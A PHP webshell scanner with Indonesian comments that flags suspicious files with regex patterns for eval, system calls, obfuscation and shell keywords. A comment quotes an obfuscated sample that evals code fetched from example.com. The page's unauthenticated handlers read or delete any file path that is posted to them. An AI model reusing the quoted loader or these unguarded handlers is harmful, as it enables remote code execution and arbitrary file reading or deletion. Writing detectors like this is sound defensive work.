<?php
// webshell_scanner.php
session_start();

// Konfigurasi
$SCAN_DIRECTORIES = ['/', '/var/www/html', '/home']; // Sesuaikan dengan direktori server
$EXCLUDED_DIRS = ['/proc', '/sys', '/dev', '/run'];
$MAX_FILE_SIZE = 10485760; // 10MB

// Pattern untuk mendeteksi webshell yang lebih komprehensif
$SUSPICIOUS_PATTERNS = [
    // Basic dangerous functions
    'eval' => '/\beval\s*\(/i',
    'assert' => '/\bassert\s*\(/i',
    'preg_replace_e' => '/preg_replace\s*\(.*[\/\'"].*e.*[\/\'"]/i',
    'create_function' => '/create_function\s*\(/i',
    
    // System commands
    'system' => '/\bsystem\s*\(/i',
    'exec' => '/\bexec\s*\(/i',
    'shell_exec' => '/\bshell_exec\s*\(/i',
    'passthru' => '/\bpassthru\s*\(/i',
    'proc_open' => '/\bproc_open\s*\(/i',
    'popen' => '/\bpopen\s*\(/i',
    
    // File operations
    'file_put_contents' => '/file_put_contents\s*\(/i',
    'fwrite' => '/\bfwrite\s*\(/i',
    'fopen' => '/\bfopen\s*\(/i',
    'file_get_contents' => '/file_get_contents\s*\(/i',
    'move_uploaded_file' => '/move_uploaded_file\s*\(/i',
    'rename' => '/\brename\s*\(/i',
    'copy' => '/\bcopy\s*\(/i',
    'unlink' => '/\bunlink\s*\(/i',
    
    // Network operations
    'curl_exec' => '/\bcurl_exec\s*\(/i',
    'fsockopen' => '/\bfsockopen\s*\(/i',
    'socket_create' => '/\bsocket_create\s*\(/i',
    
    // Encoding/decoding
    'base64_decode' => '/base64_decode\s*\(/i',
    'base64_encode' => '/base64_encode\s*\(/i',
    'gzinflate' => '/gzinflate\s*\(/i',
    'gzuncompress' => '/gzuncompress\s*\(/i',
    'str_rot13' => '/str_rot13\s*\(/i',
    
    // Obfuscation patterns
    'variable_variable' => '/\$\s*{\s*\'[^\']+\'\s*}/',
    'concatenated_eval' => '/eval\s*\(\s*[\'\"][^\'\"].*\.\s*[\'\"]/i',
    'hex_encoded' => '/\\\\x[0-9a-f]{2}/i',
    
    // Web shell specific patterns
    'cmd_param' => '/\$_GET\s*\[\s*[\'"]cmd[\'"]\s*\]/i',
    'password_param' => '/\$_POST\s*\[\s*[\'"]pass[\'"]\s*\]/i',
    'command_param' => '/\$_REQUEST\s*\[\s*[\'"]command[\'"]\s*\]/i',
    
    // File upload patterns
    'upload_feature' => '/<input[^>]*type=[\'\"]file[\'\"]/i',
    'upload_handler' => '/\$_FILES\s*\[\s*[\'"]/i',
    
    // Terminal/Shell patterns
    'terminal_keywords' => '/\b(sh|bash|cmd|powershell|terminal|shell)\b/i',
];

class WebShellScanner {
    private $suspiciousFiles = [];
    private $scanStats = [
        'scanned' => 0,
        'suspicious' => 0,
        'errors' => 0
    ];

    public function scanDirectory($directory, $excludedDirs = [], $maxFileSize = 10485760) {
        if (!is_dir($directory) || in_array($directory, $excludedDirs)) {
            return;
        }

        try {
            $files = scandir($directory);
            foreach ($files as $file) {
                if ($file == '.' || $file == '..') continue;

                $fullPath = $directory . '/' . $file;
                
                // Skip excluded directories
                if (in_array($fullPath, $excludedDirs)) {
                    continue;
                }

                if (is_dir($fullPath)) {
                    $this->scanDirectory($fullPath, $excludedDirs, $maxFileSize);
                } else {
                    $this->scanStats['scanned']++;
                    $this->checkFile($fullPath, $maxFileSize);
                }
            }
        } catch (Exception $e) {
            $this->scanStats['errors']++;
            error_log("Error scanning directory $directory: " . $e->getMessage());
        }
    }

    private function checkFile($filePath, $maxFileSize) {
        global $SUSPICIOUS_PATTERNS;

        // Check file size
        $fileSize = @filesize($filePath);
        if ($fileSize === false || $fileSize > $maxFileSize) {
            return;
        }

        // Check file extension
        $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
        $suspiciousExtensions = ['php', 'phtml', 'php3', 'php4', 'php5', 'php7', 'phar', 'inc', 'txt', 'log'];
        
        if (!in_array($extension, $suspiciousExtensions)) {
            return;
        }

        try {
            $content = file_get_contents($filePath);
            if ($content === false) {
                return;
            }

            $suspiciousSigns = [];
            $score = 0;

            // Pattern matching
            foreach ($SUSPICIOUS_PATTERNS as $patternName => $pattern) {
                if (preg_match_all($pattern, $content, $matches)) {
                    $count = count($matches[0]);
                    $suspiciousSigns[$patternName] = $count;
                    
                    // Berikan bobot berbeda untuk pattern yang berbeda
                    $weight = $this->getPatternWeight($patternName);
                    $score += ($count * $weight);
                }
            }

            // Advanced detection methods
            if ($this->isHighlyObfuscated($content)) {
                $suspiciousSigns['highly_obfuscated'] = true;
                $score += 10;
            }

            if ($this->hasRemoteFileInclusion($content)) {
                $suspiciousSigns['remote_file_inclusion'] = true;
                $score += 8;
            }

            if ($this->hasUploadFeature($content)) {
                $suspiciousSigns['upload_feature'] = true;
                $score += 6;
            }

            if ($this->hasTerminalFeature($content)) {
                $suspiciousSigns['terminal_feature'] = true;
                $score += 7;
            }

            if ($this->hasFileManagement($content)) {
                $suspiciousSigns['file_management'] = true;
                $score += 5;
            }

            // Deteksi pattern khusus seperti contoh Anda
            if ($this->detectAdvancedObfuscation($content)) {
                $suspiciousSigns['advanced_obfuscation'] = true;
                $score += 12;
            }

            if ($score > 2) { // Threshold lebih rendah untuk menangkap lebih banyak kasus
                $this->suspiciousFiles[] = [
                    'path' => $filePath,
                    'score' => $score,
                    'signs' => $suspiciousSigns,
                    'size' => $fileSize,
                    'modified' => date('Y-m-d H:i:s', filemtime($filePath)),
                    'content_sample' => substr($content, 0, 200) // Sample konten untuk preview
                ];
                $this->scanStats['suspicious']++;
            }

        } catch (Exception $e) {
            $this->scanStats['errors']++;
        }
    }

    private function getPatternWeight($patternName) {
        $weights = [
            'eval' => 3,
            'assert' => 2,
            'preg_replace_e' => 3,
            'create_function' => 2,
            'system' => 3,
            'exec' => 3,
            'shell_exec' => 3,
            'base64_decode' => 2,
            'remote_file_inclusion' => 4,
            'advanced_obfuscation' => 5,
            'highly_obfuscated' => 4
        ];
        
        return $weights[$patternName] ?? 1;
    }

    private function isHighlyObfuscated($content) {
        // Deteksi obfuscation tingkat tinggi
        $patterns = [
            '/\$\w+\s*=\s*[\'\"][^\'\"]{50,}[\'\"]/', // String sangat panjang
            '/eval\s*\(\s*(base64_decode|gzinflate)\s*\(/', // Eval dengan decoding
            '/\\$[a-z0-9_]{1,5}\s*=\s*\\$[a-z0-9_]{1,5}\s*\.\s*\\$[a-z0-9_]{1,5}/', // Concatenation berantai
        ];

        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return true;
            }
        }

        return false;
    }

    private function detectAdvancedObfuscation($content) {
        // Deteksi pattern seperti contoh Anda: <?=/****/@null; /********/ /**/ /********/@eval/****/("?>".file_get_contents/*******/("https://example.com"));/**/?>
        
        $patterns = [
            '/<\?=\/\*+\/@\w+\s*;\s*\/\*+\/\s*\/\*\/\s*\/\*+\/@eval\/\*+\/\([\'\"][^\'\"]*\.file_get_contents\/\*+\/\([^)]+\)\);\s*\/\*\*\/\?>/i',
            '/@eval\s*\(\s*[\'\"][^\'\"]*\.\s*(file_get_contents|curl_exec)\s*\(/i',
            '/<\?php\s*\/\*[^*]+\*\/\s*@\w+\s*\/\*[^*]+\*\/\s*@eval/i',
            '/eval\s*\(\s*[\'\"][^\'\"]*\.\s*\$\w+\s*\.\s*[\'\"][^\'\"]*\)\s*;/',
        ];

        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return true;
            }
        }

        // Deteksi comment stuffing dengan fungsi berbahaya
        if (preg_match('/\/\*+.*eval.*\*+\//is', $content) && preg_match('/file_get_contents\s*\(/i', $content)) {
            return true;
        }

        return false;
    }

    private function hasRemoteFileInclusion($content) {
        $patterns = [
            '/file_get_contents\s*\(\s*[\'\"](http|https|ftp):\/\//i',
            '/curl_exec\s*\(\s*[\'\"](http|https|ftp):\/\//i',
            '/include\s*\(\s*[\'\"](http|https|ftp):\/\//i',
            '/require\s*\(\s*[\'\"](http|https|ftp):\/\//i',
        ];

        foreach ($patterns as $pattern) {
            if (preg_match($pattern, $content)) {
                return true;
            }
        }
        return false;
    }

    private function hasUploadFeature($content) {
        // Deteksi form upload
        if (preg_match('/<form[^>]*enctype=[\'\"]multipart\/form-data[\'\"]/i', $content) &&
            preg_match('/<input[^>]*type=[\'\"]file[\'\"]/i', $content)) {
            return true;
        }

        // Deteksi handling file upload
        if (preg_match('/\$_FILES/i', $content) && 
            (preg_match('/move_uploaded_file/i', $content) || preg_match('/copy/i', $content))) {
            return true;
        }

        return false;
    }

    private function hasTerminalFeature($content) {
        $keywords = [
            '/\b(cmd|command|shell|terminal|bash|sh|powershell)\b/i',
            '/\$(GET|POST|REQUEST)\[[\'"](\w*cmd|\w*command|\w*shell)[\'"]\]/i',
            '/system\s*\(\s*\$(GET|POST|REQUEST)/i',
            '/exec\s*\(\s*\$(GET|POST|REQUEST)/i',
        ];

        foreach ($keywords as $pattern) {
            if (preg_match($pattern, $content)) {
                return true;
            }
        }
        return false;
    }

    private function hasFileManagement($content) {
        $fileOps = [
            'rename', 'copy', 'unlink', 'mkdir', 'rmdir', 'chmod', 'chown',
            'file_put_contents', 'fopen', 'fwrite', 'fclose'
        ];

        $count = 0;
        foreach ($fileOps as $op) {
            if (preg_match("/\b$op\s*\(/i", $content)) {
                $count++;
            }
        }

        return $count >= 3; // Jika ada 3 atau lebih operasi file, dianggap file management
    }

    public function getResults() {
        // Urutkan berdasarkan score tertinggi
        usort($this->suspiciousFiles, function($a, $b) {
            return $b['score'] - $a['score'];
        });
        
        return [
            'files' => $this->suspiciousFiles,
            'stats' => $this->scanStats
        ];
    }
}

// Handle actions
if (isset($_POST['action'])) {
    switch ($_POST['action']) {
        case 'scan':
            $scanner = new WebShellScanner();
            foreach ($SCAN_DIRECTORIES as $dir) {
                if (is_dir($dir)) {
                    $scanner->scanDirectory($dir, $EXCLUDED_DIRS, $MAX_FILE_SIZE);
                }
            }
            $_SESSION['scan_results'] = $scanner->getResults();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
            
        case 'delete':
            if (isset($_POST['file_path']) && file_exists($_POST['file_path'])) {
                if (unlink($_POST['file_path'])) {
                    $_SESSION['message'] = "File berhasil dihapus: " . htmlspecialchars($_POST['file_path']);
                } else {
                    $_SESSION['error'] = "Gagal menghapus file: " . htmlspecialchars($_POST['file_path']);
                }
            }
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
            
        case 'view_url':
            if (isset($_POST['file_path'])) {
                $url = getFileUrl($_POST['file_path']);
                header("Location: $url");
                exit;
            }
            break;
            
        case 'view_content':
            if (isset($_POST['file_path']) && file_exists($_POST['file_path'])) {
                $_SESSION['file_content'] = htmlspecialchars(file_get_contents($_POST['file_path']));
                $_SESSION['file_path'] = $_POST['file_path'];
            }
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
    }
}

function getFileUrl($filePath) {
    $docRoot = $_SERVER['DOCUMENT_ROOT'];
    $relativePath = str_replace($docRoot, '', $filePath);
    return 'http://' . $_SERVER['HTTP_HOST'] . $relativePath;
}

// Display HTML
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebShell Scanner Advanced</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1400px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 30px; }
        .btn { padding: 10px 20px; margin: 5px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; font-size: 14px; }
        .btn-scan { background: #007bff; color: white; }
        .btn-view { background: #28a745; color: white; }
        .btn-delete { background: #dc3545; color: white; }
        .btn-content { background: #ffc107; color: black; }
        .message { padding: 10px; margin: 10px 0; border-radius: 4px; }
        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
        .error { background: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
        .file-list { margin-top: 20px; }
        .file-item { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 4px; background: #f9f9f9; }
        .file-path { font-weight: bold; color: #333; font-size: 16px; }
        .file-score { color: #dc3545; font-weight: bold; font-size: 14px; }
        .file-size, .file-modified { color: #666; font-size: 12px; }
        .file-signs { margin: 10px 0; }
        .sign-item { background: #fff3cd; padding: 5px 10px; margin: 2px; border-radius: 3px; display: inline-block; font-size: 12px; }
        .stats { background: #e9ecef; padding: 15px; border-radius: 4px; margin: 20px 0; }
        .content-preview { background: #f8f9fa; padding: 15px; border: 1px solid #ddd; border-radius: 4px; margin: 10px 0; font-family: monospace; white-space: pre-wrap; font-size: 12px; max-height: 300px; overflow-y: auto; }
        .high-risk { border-left: 5px solid #dc3545; background: #f8d7da; }
        .medium-risk { border-left: 5px solid #ffc107; background: #fff3cd; }
        .low-risk { border-left: 5px solid #28a745; background: #d4edda; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Advanced WebShell Scanner</h1>
            <p>Deteksi webshell dengan fitur upload, terminal, file management, dan obfuscation</p>
        </div>

        <?php if (isset($_SESSION['message'])): ?>
            <div class="message success"><?php echo $_SESSION['message']; unset($_SESSION['message']); ?></div>
        <?php endif; ?>

        <?php if (isset($_SESSION['error'])): ?>
            <div class="message error"><?php echo $_SESSION['error']; unset($_SESSION['error']); ?></div>
        <?php endif; ?>

        <form method="post">
            <input type="hidden" name="action" value="scan">
            <button type="submit" class="btn btn-scan">🔍 Mulai Scan Mendalam</button>
        </form>

        <?php if (isset($_SESSION['file_content'])): ?>
            <div class="content-preview">
                <h4>Konten File: <?php echo htmlspecialchars($_SESSION['file_path']); ?></h4>
                <pre><?php echo $_SESSION['file_content']; ?></pre>
            </div>
            <?php unset($_SESSION['file_content'], $_SESSION['file_path']); ?>
        <?php endif; ?>

        <?php if (isset($_SESSION['scan_results'])): 
            $results = $_SESSION['scan_results'];
            $files = $results['files'];
            $stats = $results['stats'];
        ?>
            <div class="stats">
                <h3>📊 Statistik Scan:</h3>
                <p>✅ File yang di-scan: <?php echo $stats['scanned']; ?></p>
                <p>⚠️ File mencurigakan: <?php echo $stats['suspicious']; ?></p>
                <p>❌ Error: <?php echo $stats['errors']; ?></p>
            </div>

            <?php if (!empty($files)): ?>
                <div class="file-list">
                    <h3>🚨 File Mencurigakan Terdeteksi:</h3>
                    <?php foreach ($files as $file): 
                        $riskClass = $file['score'] >= 10 ? 'high-risk' : ($file['score'] >= 5 ? 'medium-risk' : 'low-risk');
                    ?>
                        <div class="file-item <?php echo $riskClass; ?>">
                            <div class="file-path">📁 <?php echo htmlspecialchars($file['path']); ?></div>
                            <div class="file-score">🎯 Skor Kecurigaan: <?php echo $file['score']; ?></div>
                            <div class="file-size">📏 Ukuran: <?php echo number_format($file['size']); ?> bytes</div>
                            <div class="file-modified">🕒 Modifikasi: <?php echo $file['modified']; ?></div>
                            
                            <div class="file-signs">
                                <strong>🔍 Tanda Mencurigakan:</strong>
                                <?php foreach ($file['signs'] as $sign => $count): 
                                    $signClass = in_array($sign, ['highly_obfuscated', 'advanced_obfuscation', 'remote_file_inclusion']) ? 'high-risk' : '';
                                ?>
                                    <span class="sign-item <?php echo $signClass; ?>"><?php echo htmlspecialchars("$sign: $count"); ?></span>
                                <?php endforeach; ?>
                            </div>

                            <?php if (!empty($file['content_sample'])): ?>
                                <div class="content-preview">
                                    <strong>Sample Konten:</strong><br>
                                    <?php echo htmlspecialchars($file['content_sample']); ?>...
                                </div>
                            <?php endif; ?>

                            <div class="file-actions">
                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="action" value="view_content">
                                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file['path']); ?>">
                                    <button type="submit" class="btn btn-content">📄 Lihat Konten Lengkap</button>
                                </form>

                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="action" value="view_url">
                                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file['path']); ?>">
                                    <button type="submit" class="btn btn-view" onclick="return confirm('⚠️ Buka URL file ini? Pastikan ini aman!')">🌐 Buka URL</button>
                                </form>

                                <form method="post" style="display: inline;">
                                    <input type="hidden" name="action" value="delete">
                                    <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($file['path']); ?>">
                                    <button type="submit" class="btn btn-delete" onclick="return confirm('❌ Yakin hapus file ini? Tindakan ini tidak dapat dibatalkan!')">🗑️ Hapus</button>
                                </form>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php else: ?>
                <p>✅ Tidak ditemukan file mencurigakan.</p>
            <?php endif; ?>
            
            <?php unset($_SESSION['scan_results']); ?>
        <?php endif; ?>
    </div>
</body>
</html>
